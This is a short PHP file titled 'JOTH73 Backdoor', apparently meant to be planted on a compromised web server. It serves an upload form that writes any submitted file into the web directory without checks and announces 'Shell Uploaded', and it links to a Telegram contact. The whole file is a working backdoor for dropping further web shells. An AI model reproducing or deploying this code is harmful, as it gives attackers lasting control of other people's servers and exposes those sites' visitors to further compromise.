<?php
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

echo '<html>
<title> JOTH73 Backdoor </title>
<center>
	<h1> JOTH73 </h1>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<input type="file" name="file" size="50">
<input name="_upl" type="submit" id="_upl" value="Upload">
</form>';

if(isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo '<b>Shell Uploaded ! :)<b><br><br>';
        echo '<b>File: ' . $_FILES['file']['name'] . '</b><br><br>';
    } else {
        echo '<b>Not uploaded ! </b><br><br>';
    }
}

echo '<bgcolor="#000"><center><pre><font size="4px" color="white"><p>[ <a href="https://t.me/alhwualS"><font color="red" face="courier">Telegram</font></a>]</p></font></pre></center>
<div class="typewriter">
</html>';
?>
